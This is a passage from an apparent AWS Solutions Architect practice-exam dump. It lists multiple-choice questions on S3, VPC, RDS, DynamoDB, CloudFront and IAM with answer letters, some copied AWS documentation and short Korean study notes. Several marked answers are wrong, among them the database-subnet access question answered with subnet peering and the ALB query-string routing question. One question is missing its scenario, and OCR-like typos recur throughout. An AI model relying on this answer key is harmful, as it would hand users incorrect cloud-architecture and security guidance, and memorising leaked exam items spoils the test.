developer account to copy the log files to the central account. Create an IAM role in the central account for the auditor. Attach an IAM policy providing read-only permissions to the bucket. B. Configure CloudTrail from each developer account to deliver the log files to an S3 bucket in the central account. Create an IAM user in the central account for the auditor. Attach an IAM policy providing full permissions to the bucket. C. Configure CloudTrail from each developer account to deliver the log files to an S3 bucket in the central account. Create an IAM role in the central account for the auditor. Attach an IAM policy providing read-only permissions to the bucket. D. Configure an AWS Lambda function in the central account to copy the log files from the S3 bucket in each developer account. Create an IAM user in the central account for the auditor. Attach an IAM policy providing full permissions to the bucket. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company has several Amazon EC2 instances set up in a private subnet for security reasons These instances host applications that read and write large amounts of data to and from Amazon S3 regularly. Currently, subnet routing directs all the traffic destined for the internet through a NAT gateway The company wants to optimize the overall cost without impacting the ability of the application to communicate with Amazon S3 or the outside internet What should a solutions architect do to optimize costs?\nA. Create an additional NAT gateway Update the route table to route to the NAT gateway Update the network ACL to allow S3 traffic B. Create an internet gateway Update the route table to route traffic to the internet gateway Update the network ACL to allow S3 traffic. C. Create a VPC endpoint for Amazon S3 Attach an endpoint policy to the endpoint Update the route table to direct traffic to the VPC endpoint D. Create an AWS Lambda function outside of the VPC to handle S3 requests Attach an IAM policy to the EC2 instances, allowing them to invoke the Lambda function. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A web application is deployed in the AWS Cloud It consists of a two-tier architecture that includes a web layer and a database layer The web server is vulnerable to cross-site scripting (XSS) attacks What should a solutions architect do to remediate the vulnerability?\nA. Create a Classic Load Balancer Put the web layer behind the load balancer and enable AWS WAF B. Create a Network Load Balancer Put the web layer behind the load balancer and enable AWS WAF C. Create an Application Load Balancer Put the web layer behind the load balancer and enable AWS WAF D. Create an Application Load Balancer Put the web layer behind the load balancer and use AWS Shield Standard \r문제 풀이\r...\r\rAnswer: C Explanation Working with cross-site scripting match conditions Attackers sometimes insert scripts into web requests in an effort to exploit vulnerabilities in web applications. You can create one or more cross-site scripting match conditions to identify the parts of web requests, such as the URI or the query string, that you want AWS WAF Classic to inspect for possible malicious scripts. Later in the process, when you create a web ACL, you specify whether to allow or block requests that appear to contain malicious scripts. Web Application Firewall You can now use AWS WAF to protect your web applications on your Application Load Balancers. AWS WAF is a web application firewall that helps protect your web applications from common web exploits that could affect application availability, compromise security, or consume excessive resources. https://docs.aws.amazon.com/waf/latest/developerguide/classic-web-acl-xss-conditions.html https://aws.amazon.com/elasticloadbalancing/features/\r\r\r\r   QUESTION A company has an on-premises application that generates a large amount of time-sensitive data that is backed up to Amazon S3. The application has grown and there are user complaints about internet bandwidth limitations. A solutions architect needs to design a long term solution that allows for both timely backups to Amazon S3 and with minimal impact on internet connectivity tor internal users. Which solution meets these requirements?\nA. Establish AWS VPN connections and proxy all traffic through a VPC gateway endpoint B. Establish a new AWS Direct Connect connection and direct backup traffic through this new connection C. Order daily AWS Snowball devices Load the data onto the Snowball devices and return the devices to AWS each day D. Submit a support ticket through the AWS Management Console Request the removal of S3 service limits from the account. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION An application running on an Amazon EC2 instance needs to securely access tiles on an Amazon Elastic File System (Amazon I tile system. The EFS tiles are stored using encryption at rest. Which solution for accessing the tiles is MOST secure?\nA. Enable TLS when mounting Amazon EFS\nB. Store the encryption key in the code of the application\nC. Enable AWS Key Management Service (AWS KMS) when mounting Amazon EFS\nD. Store the encryption key in an Amazon S3 bucket and use IAM roles to grant the EC2 instance access permission \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A solutions architect is designing a customer-facing application. The application is expected to have a variable amount of reads and writes depending on the time of year and clearly defined access patterns throughout the year. Management requires that database auditing and scaling be managed in the AWS Cloud. The Recovery Point Objective (RPO) must be less than 5 hours. Which solutions can accomplish this? (Select TWO.)\nA. Use Amazon DynamoDB with auto scaling. Use on-demand backups and AWS CloudTrail. B. Use Amazon DynamoDB with auto scaling. Use on-demand backups and Amazon DynamoDB Streams. C. Use Amazon Redshift Configure concurrency scaling. Enable audit logging. Perform database snapshots every 4 hours. D. Use Amazon RDS with Provisioned IOPS. Enable the database auditing parameter. Perform database snapshots every 5 hours. E. Use Amazon RDS with auto scaling. Enable the database auditing parameter. Configure the backup retention period to at least 1 day. \r문제 풀이\r...\r\rAnswer: A B \r\r\r   QUESTION Management has decided to deploy all AWS VPCs with IPv6 enabled After some time a solutions architect tries to launch a new instance and receives an error stating that there is not enough IP address space available in the subnet What should the solutions architect do to fix this?\nA. Check to make sure that only IPv6 was used during the VPC creation. B. Create a new IPv4 subnet with a larger range, and then launch the instance C. Create a new IPv6-only subnet with a larger range, and then launch the instance D. Disable the IPv4 subnet and migrate all instances to IPv6 only Once that is complete launch the instance \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A solutions architect is designing the storage architecture for a new web application used for stonng and viewing engineering drawings. All application components will be deployed on the AWS infrastructure. The application design must support caching to minimize the amount of time that users wait for the engineering drawings to load. The application must be able to store petabytes of data. Which combination of storage and caching should the solutions architect use?\nA. Amazon S3 with Amazon CloudFront\nB. Amazon S3 Glacier with Amazon ElastiCache\nC. Amazon Elastic Block Store (Amazon EBS) volumes with Amazon CloudFront\nD. AWS Storage Gateway with Amazon ElastiCache \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company is hosting its static website in an Amazon S3 bucket, which is the origin for Amazon CioudFront. The company has users in the United States. Canada, and Europe and wants to reduce costs. What should a solutions architect recommend?\nA. Adjust the CloudFront caching time to live (TTL) from the default to a longer timeframe. B. Implement CloudFront events with Lambda@Edge to run the website\u0026rsquo;s data processing. C. Modify the CloudFront price class to include only the locations of the countries that are served. D. Implement a CloudFront Secure Sockets Layer (SSL) certificate to push security closer to the locations of the countries that are served. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company hosts a training site on a fleet of Amazon EC2 instances. The company anticipates that its new course, which consists of dozens of training videos on the site, will be extremely popular when it is released in 1 week. What should a solutions architect do to minimize the anticipated server load?\nA. Store the videos in Amazon ElastiCache for Redis Update the web servers to serve the videos using the Elastic ache API B. Store the videos in Amazon Elastic File System (Amazon EFS) Create a user data script for the web servers to mount the EFS volume. C. Store the videos in an Amazon S3 bucket Create an Amazon CloudFlight distribution with an origin access identity (OAI) of that S3 bucket Restrict Amazon S3 access to the OAI. D. Store the videos in an Amazon S3 bucket. Create an AWS Storage Gateway file gateway to access the S3 bucket Create a user data script for the web servers to mount the file gateway \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company needs to comply with a regulatory requirement that states all emails must Pestored and archived externally for 7 years. An administrator has created compressed email files on premises and wants a managed service to transfer the files to AWS storage. Which managed service should a solutions architect recommend?\nA. Amazon Elastic File System (Amazon EPS) B. Amazon S3 Glacier C. AWS Backup D. AWS Storage Gateway \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A solutions architect is developing a multiple-subnet VPC architecture. The solution will consist of six subnets in two Availability Zones. The subnets are defined as public, private and dedicated for databases Only the Amazon EC2 instances running in the private subnets should be able to access a database. Which solution meets these requirements?\nA. Create a now route table that excludes the route to the public subnets' CIDR blocks Associate the route table lo the database subnets. B. Create a security group that denies ingress from the security group used by instances in the public subnets Attach the security group to an Amazon RDS DB instance C. Create a security group that allows ingress from the security group used by instances in the private subnets. Attach the security group to an Amazon RDS DB instance. D. Create a new peering connection between the public subnets and the private subnets. Create a different peering connection between the private subnets and the database subnets. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company is performing an AWS Well-Architected Framework review of an existing workload deployed on AWS. The review identified a public-facing website running on the same Amazon EC2 instance as a Microsoft Active Directory domain controller that was install recently to support other AWS services. A solutions architect needs to recommend a new design that would improve the security of the architecture and minimize the administrative demand on IT staff. What should the solutions architect recommend?\nA. Use AWS Directory Service to create a managed Active Directory. Uninstall Active Directory on the current EC2 instance.\nB. Create another EC2 instance in the same subnet and reinstall Active Directory on it. Uninstall Active Directory.\nC. Use AWS Directory Service to create an Active Directory connector. Proxy Active Directory requests to the Active domain controller running on the current EC2 instance.\nD. Enable AWS Single Sign-On (AWS SSO) with Security Assertion Markup Language (SAML) 2.0 federation with the current Active Directory controller. Modify the EC2 instance\u0026rsquo;s security group to deny public access to Active Directory. \r문제 풀이\r...\r\rAnswer: A Explanation AWS Managed Microsoft AD AWS Directory Service lets you run Microsoft Active Directory (AD) as a managed service. AWS Directory Service for Microsoft Active Directory, also referred to as AWS Managed Microsoft AD, is powered by Windows Server 2012 R2. When you select and launch this directory type, it is created as a highly available pair of domain controllers connected to your virtual private cloud (VPC). The domain controllers run in different Availability Zones in a region of your choice. Host monitoring and recovery, data replication, snapshots, and software updates are automatically configured and managed for you. https://docs.aws.amazon.com/directoryservice/latest/admin-guide/directory_microsoft_ad.html\r\r\r\r   QUESTION A company wants to host a scalable web application on AWS. The application will be accessed by users from different geographic regions of the world. Application users will be able to download and upload unique data up to gigabytes in size. The development team wants a cost-effective solution to minimize upload and download latency and maximize performance. What should a solutions architect do to accomplish this?\nA. Use Amazon S3 with Transfer Acceleration to host the application. B. Use Amazon S3 with CacheControl headers to host the application. C. Amazon EC2 with Auto Scaling and Amazon CloudFront to host the application. D. Use Amazon EC2 with Auto Scaling and Amazon ElastiCache to host the application. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION As part of budget planning, management wants a report of AWS billed items listed by user. The data will be used to create department budgets. A solutions architect needs to determine the most efficient way to obtain this report information. Which solution meets these requirements?\nA. Run a query with Amazon Athena to generate the report. B. Create a report in Cost Explorer and download the report. C. Access the bill details from the billing dashboard and download the bill. D. Modify a cost budget in AWS Budgets to alert with Amazon Simple Email Service (Amazon SES). \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION Which solution will improve the performance of the application when it is moved to AWS?\nA. Import the data into an Amazon DynamoDB table with provisioned capacity. Refactor the application to use DynamoDB for reports. B. Create the database on a compute optimized Amazon EC2 instance Ensure compute resources exceed the on-premises database C. Create an Amazon Aurora MySQL Multi-AZ DB cluster with multiple read replicas. Configure the application to use the reader endpoint tor reports. D. Create an Amazon Aurora MySQL Multi-AZ DB cluster Configure The application to use the backup instance of the cluster as an endpoint for the reports. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company is using a tape backup solution to store its key application data offsite The daily data volume is around 50 TB The company needs to retain the backups for 7 years for regulatory purposes The backups are rarely accessed and a week\u0026rsquo;s notice is typically given if a backup needs to be restored The company is now considering a cloud-based option to reduce the storage costs and operational burden of managing tapes The company also wants to make sure that the transition (rom tape backups to the cloud minimizes disruptions Which storage solution is MOST cost-effective'?\nA. Use Amazon Storage Gateway to back up to Amazon Glacier Deep Archive B. Use AWS Snowball Edge to directly integrate the backups with Amazon S3 Glacier. C. Copy the backup data to Amazon S3 and create a lifecycle policy to move the data to Amazon S3 Glacier D. Use Amazon Storage Gateway to back up to Amazon S3 and create a lifecycle policy to move the backup to Amazon S3 Glacier \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has a multi-tier application that runs six front-end web servers in an Amazon EC2 Auto Scaling group in a single Availability Zone behind an Application Load Balancer (ALB) A solutions architect needs to modify the infrastructure to be highly available without modifying the application Which architecture should the solutions architect choose that provides high availability?\nA. Create an Auto Scaling group that uses three instances across each of two Regions B. Modify the Auto Scaling group to use three instances across each of two Availability Zones C. Create an Auto Scaling template that can be used to quickly create more instances in another Region D. Change the ALB in front of the Amazon EC2 instances in a round-robin configuration to balance traffic to the web tier \r문제 풀이\r...\r\rAnswer: B Explanation https://docs.aws.amazon.com/autoscaling/ec2/userguide/as-add-availability-zone.html Expanding Your Scaled and Load-Balanced Application to an Additional Availability Zone When one Availability Zone becomes unhealthy or unavailable, Amazon EC2 Auto Scaling launches new instances in an unaffected zone. When the unhealthy Availability Zone returns to a healthy state, Amazon EC2 Auto Scaling automatically redistributes the application instances evenly across all of the zones for your Auto Scaling group. Amazon EC2 Auto Scaling does this by attempting to launch new instances in the Availability Zone with the fewest instances. If the attempt fails, however, Amazon EC2 Auto Scaling attempts to launch in other Availability Zones until it succeeds. You can expand the availability of your scaled and load-balanced application by adding an Availability Zone to your Auto Scaling group and then enabling that zone for your load balancer. After you\u0026rsquo;ve enabled the new Availability Zone, the load balancer begins to route traffic equally among all the enabled zones. https://docs.aws.amazon.com/autoscaling/ec2/userguide/as-add-availability-zone.html\r\r\r\r   QUESTION A company is running a highly sensitive application on Amazon EC2 backed by an Amazon RDS database Compliance regulations mandate that all personally identifiable information (Pll) be encrypted at rest Which solution should a solutions architect recommend to meet this requirement with the LEAST amount of changes to the infrastructure??\nA. Deploy AWS Certificate Manager to generate certificates Use the certificates to encrypt the database volume B. Deploy AWS CloudHSM. generate encryption keys, and use the customer master key (CMK) to encrypt database volumes. C. Configure SSL encryption using AWS Key Management Service customer master keys (AWS KMS CMKs) to encrypt database volumes D. Configure Amazon Elastic Block Store {Amazon EBS) encryption and Amazon RDS encryption with AWS Key Management Service (AWS KMS) keys to encrypt instance and database volumes. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company has 700 TB of backup data stored in network attached storage (NAS) in its data center This backup data need to be accessible for infrequent regulatory requests and must be retained 7 years. The company has decided to migrate this backup data from its data center to AWS. The migration must be complete within 1 month The company has 500 Mbps of dedicated bandwidth on its public internet connection available for data transfer. What should a solutions architect do to migrate and store the data at the LOWEST cost?\nA. Order AWS Snowball devices to transfer the data Use a lifecycle policy to transition the files to Amazon S3 Glacier Deep Archive B. Deploy a VPN connection between the data center and Amazon VPC Us the AWS CLI to copy the data from on premises to Amazon S3 Glacier. C. Provision a 500 Mbps AWS Direct Connect connection and transfer the data to Amazon S3. Use a lifecycle policy to transition the files to Amazon S3 Glacier Deep Archive. D. Use AWS DataSync to transfer the data and deploy a DataSync agent on premises Use the DataSync task to copy files from the on-premises NAS storage lo Amazon S3 Glacier \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION An application requires a development environment (DEV) and production environment (PROD) for several years. The DEV instances will run for 10 hours each day during normal business hours, while the PROD instances will run 24 hours each day. A solutions architect needs to determine a compute instance purchase strategy to minimize costs. Which solution is the MOST cost-effective?\nA. DEV with Spot Instances and PROD with On-Demand Instances B. DEV with On-Demand Instances and PROD with Spot Instances C. DEV with Scheduled Reserved Instances and PROD with Reserved Instances D. DEV with On-Demand Instances and PROD with Scheduled Reserved Instances \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company has established a new AWS account. The account is newly provisioned and no changed have been made to the default settings. The company is concerned about the security of the AWS account root user. What should be done to secure the root user?\nA. Create IAM users for daily administrative tasks Disable the root user. B. Create IAM users for daily administrative tasks Enable multi-factor authentication on the root user. C. Generate an access key for the root user. Use the access key for daily administration tasks instead of the AWS Management Console. D. Provide the root user credentials to the most senior solution architect. Have the solution architect use the root user for daily administration tasks. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company recently expanded globally and wants to make its application accessible to users in those geographic locations. The application is deploying on Amazon EC2 instances behind an Application Load balancer in an Auto Scaling group. The company needs the ability shift traffic from resources in one region to another. What should a solutions architect recommend?\nA. Configure an Amazon Route 53 latency routing policy B. Configure an Amazon Route 53 geolocation routing policy C. Configure an Amazon Route 53 geoproximity fouling policy. D. Configure an Amazon Route 53 multivalue answer routing policy \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION A company hosts a static website within an Amazon S3 bucket. A solutions architect needs to ensure that data can be recovered in case of accidental deletion. Which action will accomplish this?\nA. Enable Amazon S3 versioning B. Enable Amazon S3 Intelligent-Tiering. C. Enable an Amazon S3 lifecycle policy D. Enable Amazon S3 cross-Region replication. \r문제 풀이\r...\r\rAnswer: A Explanation Data can be recover if versioning enable, also it provide a extra protection like file delete,MFA delete. MFA Delete only works for CLI or API interaction, not in the AWS Management Console. Also, you cannot make version DELETE actions with MFA using IAM user credentials. You must use your root AWS account. https://aws.amazon.com/blogs/security/securing-access-to-aws-using-mfa-part-3/ Object Versioning Use Amazon S3 Versioning to keep multiple versions of an object in one bucket. For example, you could store my-image.jpg (version 111111) and my-image.jpg (version 222222) in a single bucket. S3 Versioning protects you from the consequences of unintended overwrites and deletions. You can also use it to archive objects so that you have access to previous versions. You must explicitly enable S3 Versioning on your bucket. By default, S3 Versioning is disabled. Regardless of whether you have enabled Versioning, each object in your bucket has a version ID. If you have not enabled Versioning, Amazon S3 sets the value of the version ID to null. If S3 Versioning is enabled, Amazon S3 assigns a version ID value for the object. This value distinguishes it from other versions of the same key. https://docs.aws.amazon.com/AmazonS3/latest/dev/ObjectVersioning.html\r\r\r\r   QUESTION A company decides to migrate its three-tier web application from on premises to the AWS Cloud. The new database must be capable of dynamically scaling storage capacity and performing table joins. Which AWS service meets these requirements?\nA. Amazon Aurora B. Amazon RDS for SqlServer C. Amazon DynamoDB Streams D. Amazon DynamoDB on-demand \r문제 풀이\r...\r\rAnswer: A  DynamoDB는 조인이 가능하지 않습니다. (NoSQL)  \r\r\r   QUESTION A web application must persist order data to Amazon S3 to support neat-real time processing. A solutions architect needs create an architecture that is both scalable and fault tolerant. Which solutions meet these requirements? (Select TWO )\nA. Write the order event to an Amazon DynamoDB table. Use DynamoDB Streams to trigger an AWS Lambda function that parses the payload and writes the data to Amazon S3. B. Write the order event to an Amazon Simple Queue Service (Amazon SQS) queue. Use the queue to trigger an AWS Lambda function that parsers the payload and writes the data to Amazon S3. C. Write the order event to an Amazon Simple Notification Service (Amazon SNS) topic. Use the SNS topic to trigger an AWS Lambda function that parses the payload and writes the data to Amazon S3 D. Write the order event to an Amazon Simple Queue Service (Amazon SQS) queue. Use an Amazon EventBridge (Amazon CloudWatch Events) rule to trigger an AWS Lambda function that parses the payload and writes the data to Amazon S3 E. Write the order event to an Amazon Simple Notification Service (Amazon SNS) topic Use an Amazon EventBridge (Amazon CloudWatch Events) rule to trigger an AWS Lambda function that parses the payload and writes the data to Amazon S3 \r문제 풀이\r...\r\rAnswer: B E \r\r\r   QUESTION A company operates a website on Amazon EC2 Linux instances. Some of the instances are faring Troubleshooting points to insufficient swap space on the failed instances. The operations team lead needs a solution to monitor this. What should a solutions architect recommend?\nA. Configure an Amazon CloudWatch SwapUsage metric dimension. Monitor the SwapUsage dimension in the EC2 metrics in CloudWatch.\nB. Use EC2 metadata to collect information, then publish it to Amazon CloudWatch custom metrics. Monitor SwapUsage metrics in CloudWatch.\nC. Install an Amazon CloudWatch agent on the instances. Run an appropriate script on a set schedule. Monitor SwapUtilizalion metrics in CloudWatch.\nD. Enable detailed monitoring in the EC2 console. Create an Amazon CloudWatch SwapUtilizalion custom metric. Monitor SwapUtilization metrics in CloudWatch. \r문제 풀이\r...\r\rAnswer: C \r\r\r   QUESTION An application is running on Amazon EC2 instances Sensitive information required for the application is stored in an Amazon S3 bucket The bucket needs to be protected from internet access while only allowing services within the VPC access to the bucket. Which combination of actions should a solutions archived take to accomplish this'' (Select TWO.)\nA. Create a VPC endpoint for Amazon S3. B. Enable server access logging on the bucket C. Apply a bucket policy to restrict access to the S3 endpoint. D. Add an S3 ACL to the bucket that has sensitive information E. Restrict users using the IAM policy to use the specific bucket \r문제 풀이\r...\r\rAnswer: A C \r\r\r   QUESTION Application developers have noticed that a production application is very slow when business reporting users run large production reports against the Amazon RDS instance backing the application. the CPU and memory utilization metrics for the RDS instance-d not exceed 60% while the reporting queries are running. The business reporting users must be able to generate reports without affecting the applications performance. Which action will accomplish this?\nA. Increase the size of the RDS instance B. Create a read replica and connect the application to it. C. Enable multiple Availability Zones on the RDS instance D. Create a read replication and connect the business reports to it. \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company recently implemented hybrid cloud connectivity using AWS Direct Connect and is migrating data to Amazon S3. The company is looking for a fully managed solution that will automate and accelerate the replication of data between the on-premises storage systems and AWS storage services. Which solution should a solutions architect recommend to keep the data private?\nA. Deploy an AWS DataSync agent tor the on-premises environment Configure a sync job to replicate the data and connect it with an AWS service endpoint. B. Deploy an AWS DataSync agent for the on-premises environment. Schedule a batch job to replicate point-ln-time snapshots to AWS. C. Deploy an AWS Storage Gateway volume gateway for the on-premises environment Configure it to store data locally, and asynchronously back up point-in-time snapshots to AWS. D. Deploy an AWS Storage Gateway file gateway for the on-premises environment. Configure it to store data locally, and asynchronously back up point-in-lime snapshots to AWS. \r문제 풀이\r...\r\rAnswer: A  DataSync는 온 프레미스에서 AWS로 실제 데이터를 전송하는 반면 Storage Gateway는 AWS로 전송되는 데이터에 대한 액세스를 유지합니다.  \r\r\r   QUESTION A company is preparing to deploy a data lake on AWS A solutions architect must define the encryption strategy tor data at rest m Amazon S3 The company\u0026rsquo;s security policy states\n Keys must be rotated every 90 days Strict separation of duties between key users and key administrators must be implemented Auditing key usage must be possible What should the solutions architect recommend?  A. Server-side encryption with AWS KMS managed keys (SSE-KMS) with customer managed customer master keys (CMKs) B. Server-side encryption with AWS KMS managed keys (SSE-KMS) with AWS managed customer master keys (CMKs) C. Server-side encryption with Amazon S3 managed keys (SSE-S3) with customer managed customer master keys (CMKs) D. Server-side encryption with Amazon S3 managed keys (SSE-S3) with AWS managed customer master keys (CMKs) \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A media company is evaluating the possibility of moving its systems to the AWS Cloud. The company needs at least 10 TB of storage with the maximum possible I/O performance for video processing. 300 TB of very durable storage for storing media content, and 900 TB of storage to meet requirements for archival media that is not in use anymore. Which set of services should a solutions architect recommend to meet these requirements?\nA. Amazon EBS for maximum performance, Amazon S3 for durable data storage, and Amazon S3 Glacier for archival storage B. Amazon EBS for maximum performance. Amazon EFS for durable data storage, and Amazon S3 Glacier for archival storage C. Amazon EC2 instance store for maximum performance, Amazon EFS for durable data storage, and Amazon S3 for archival storage D. Amazon EC2 instance store for maximum performance, Amazon S3 for durable data storage, and Amazon S3 Glacier for archival storage \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A security team wants to limit access to specific services or actions in all of the team\u0026rsquo;s AWS accounts. All accounts belong to a large organization in AWS Organizations The solution must be scalable and there must be a single point where permissions can be maintained. What should a solutions architect do to accomplish this?\nA. Create an ACL to provide access to the services or actions. B. Create a security group to allow accounts and attach it to user groups C. Create cross-account roles in each account to deny access to the services or actions. D. Create a service control policy in the root organizational unit to deny access to the services or actions \r문제 풀이\r...\r\rAnswer: D Explanation https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scp.html. Service Control Policy concepts SCPs offer central access controls for all IAM entities in your accounts. You can use them to enforce the permissions you want everyone in your business to follow. Using SCPs, you can give your developers more freedom to manage their own permissions because you know they can only operate within the boundaries you define. You create and apply SCPs through AWS Organizations. When you create an organization, AWS Organizations automatically creates a root, which forms the parent container for all the accounts in your organization. Inside the root, you can group accounts in your organization into organizational units (OUs) to simplify management of these accounts. You can create multiple OUs within a single organization, and you can create OUs within other OUs to form a hierarchical structure. You can attach SCPs to the organization root, OUs, and individual accounts. SCPs attached to the root and OUs apply to all OUs and accounts inside of them. SCPs use the AWS Identity and Access Management (IAM) policy language; however, they do not grant permissions. SCPs enable you set permission guardrails by defining the maximum available permissions for IAM entities in an account. If a SCP denies an action for an account, none of the entities in the account can take that action, even if their IAM permissions allow them to do so. The guardrails set in SCPs apply to all IAM entities in the account, which include all users, roles, and the account root user. https://aws.amazon.com/blogs/security/how-to-use-service-control-policies-to-set-permissionguardrails-across-a\r\r\r\r   QUESTION A manufacturing company wants to implement predictive maintenance on its machinery equipment The company will install thousands of loT sensors that will send data to AWS in real time A solutions architect is tasked with implementing a solution that will receive events in an ordered manner for each machinery asset and ensure that data is saved for further processing at a later time Which solution would be MOST efficient?\nA. Use Amazon Kinesis Data Streams for real-time events with a artition for each equipment asset Use Amazon Kinesis Data Firehose to save data to Amazon S3 B. Use Amazon Kinesis Data Streams for real-time events with a shard for each equipment asset Use Amazon Kinesis Data Firehose to save data to Amazon EBS C. Use an Amazon SQS FIFO queue for real-time events with one queue for each equipment asset Trigger an AWS Lambda function for the SQS queue to save data to Amazon EFS D. Use an Amazon SQS standard queue for real-time events with one queue for each equipment asset Trigger an AWS Lambda function from the SQS queue to save data to Amazon S3 \r문제 풀이\r...\r\rAnswer: C  Kinesis Firehose는 현재 s3 및 redshift 만 지원합니다. Explanation Amazon SQS Introduces FIFO Queues with Exactly-Once Processing and Lower Prices for Standard Queues You can now use Amazon Simple Queue Service (SQS) for applications that require messages to be processed in a strict sequence and exactly once using First-in, First-out (FIFO) queues. FIFO queues are designed to ensure that the order in which messages are sent and received is strictly preserved and that each message is processed exactly once. Amazon SQS is a reliable and highly-scalable managed message queue service for storing messages in transit between application components. FIFO queues complement the existing Amazon SQS standard queues, which offer high throughput, best-effort ordering, and at-least-once delivery. FIFO queues have essentially the same features as standard queues, but provide the added benefits of supporting ordering and exactly-once processing. FIFO queues provide additional features that help prevent unintentional duplicates from being sent by message producers or from being received by message consumers. Additionally, message groups allow multiple separate ordered message streams within the same queue. https://aws.amazon.com/about-aws/whats-new/2016/11/amazon-sqs-introduces-fifo-queues-withexactly-once-pr  \r\r\r   QUESTION A company has a hybrid application hosted on multiple on-premises servers with static IP addresses. There is already a VPN that provides connectivity between the VPC and the on-premises network. The company wants to distribute TCP traffic across the on-premises servers for internet users. What should a solutions architect recommend to provide a highly available and scalable solution?\nA. Launch an internet-facing Network Load Balancer (NLB) and register on-premises IP addresses with the NLB. B. Launch an internet-facing Application Load Balancer (ALB) and register on-premises IP addresses with the ALB. C. Launch an Amazon EC2 instance, attach an Elastic IP address, and distribute traffic to the onpremises servers. D. Launch an Amazon EC2 instance with public IP addresses in an Auto Scaling group and distribute traffic to the on-premises servers. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company is migrating from an on-premises infrastructure to the AWS Cloud One of the company\u0026rsquo;s applications stores files on a Windows file server farm that uses Distributed File System Replication (DFSR) to keep data in sync A solutions architect needs to replace the file server farm Which service should the solutions architect use?\nA. Amazon EFS B. Amazon FSx C. Amazon S3 D. AWS Storage Gateway \r문제 풀이\r...\r\rAnswer: B  Amazon FSx는 회사의 애플리케이션은 Windows 파일 서버 팜에 파일을 저장합니다. Amazon FSx는 비즈니스 애플리케이션 용 Windows 파일 서버용 Amazon FSx와 고성능 워크로드 용 Luster 용 Amazon FSx 중에서 선택할 수있는 두 가지 파일 시스템을 제공합니다. Explanation Migrating Existing Files to Amazon FSx for Windows File Server Using AWS DataSync We recommend using AWS DataSync to transfer data between Amazon FSx for Windows File Server file systems. DataSync is a data transfer service that simplifies, automates, and accelerates moving and replicating data between on-premises storage systems and other AWS storage services over the internet or AWS Direct Connect. DataSync can transfer your file system data and metadata, such as ownership, time stamps, and access permissions.  \r\r\r   QUESTION A company that operates a web application on premises is preparing to launch a newer version of the application on AWS. The company needs to route requests to either the AWS-hosted or the on-premises-hosted application based on the URL query string. The on-premises application is not available from the internet, and a VPN connection is established between Amazon VPC and the company\u0026rsquo;s data center. The company wants to use an Application Load Balancer (ALB) for this launch. Which solution meets these requirements?\nA. Use two ALBs: one for on premises and one for the AWS resource. Add hosts to each target group of each ALB. Route with Amazon Route 53 based on the URL query string. B. Use two ALBs: one for on premises and one for the AWS resource. Add hosts to the target group of each ALB. Create a software router on an EC2 instance based on the URL query string. C. Use one ALB with two target groups: one for the AWS resource and one for on premises. Add hosts to each target group of the ALB. Configure listener rules based on the URL query string. D. Use one ALB with two AWS Auto Scaling groups: one for the AWS resource and one for on premises. Add hosts to each Auto Scaling group. Route with Amazon Route 53 based on the URL query string. \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company built an application that lets users check in to places they visit, rank the places, and add reviews about their experiences The application is successful with a rapid increase in the number of users every month The chief technology officer fears the database supporting the current Infrastructure may not handle the new load the following month because the single Amazon RDS for MySQL instance has triggered alarms related lo resource exhaustion due to read requests. What can a solutions architect recommend to prevent service Interruptions at the database layer with minimal changes to code?\nA. Create an Amazon EMR cluster and migrate the data to a Hadoop Distributed File System (HDFS) with a replication factor of 3. B. Create RDS read replicas and redirect read-only traffic to the read replica endpoints Enable a Multi-AZ deployment. C. Create an Amazon ElastiCache cluster and redirect all read-only traffic to the cluster. Set up the cluster to be deployed m three Availability Zones. D. Create an Amazon DynamoDB table to replace the RDS instance and redirect all read-only traffic to the DynamoDB table Enable DynamoDB Accelerator to offload traffic from the main table. \r문제 풀이\r...\r\rAnswer: B \r\r\r   QUESTION A company wants to use Amazon S3 for the secondary copy of its on-premises dataset. The company would rarely need to access this copy. The storage solution\u0026rsquo;s cost should be minimal. Which storage solution meets these requirements?\nA. S3 Standard B. S3 Intelligent-Tiering C. S3 Standard-Infrequent Access (S3 Standard-IA) D. S3 One Zone-Infrequent Access (S3 One Zone-IA) \r문제 풀이\r...\r\rAnswer: D \r\r\r   QUESTION A company is using Amazon DynamoDB with provisioned throughput for the database tier of its ecommerce website. During flash sales, customers experience periods of time when the database cannot handle the high number of transactions taking place. This causes the company to lose transactions During normal periods, the database performs appropriately. Which solution solves the performance problem the company faces?\nA. Switch DynamoDB to on-demand mode during flash sales B. Implement DynamoDB Accelerator for fast in memory performance C. Use Amazon Kinesis to queue transactions for processing to DynamoDB D. Use Amazon Simple Queue Service (Amazon SQS) to queue transactions to DynamoDB \r문제 풀이\r...\r\rAnswer: A \r\r\r   QUESTION A company has a mobile chat application with a data store based in Amazon DynamoDB. Users would like new messages to be read with as little latency as possible. A solutions architect needs to design an optimal solution that requires minimal application changes. Which method should the solutions architect select?\nA. Configure Amazon DynamoDB Accelerator (DAX) for the new messages table. Update the code to use the DAX endpoint. B. Add DynamoDB read replicas to handle the increased read load. Update the application to point to the read endpoint for the read replicas. C. Double the number of read capacity units for the new messages table in DynamoDB. Continue to use the existing DynamoDB endpoint. D. Add an Amazon ElastiCache 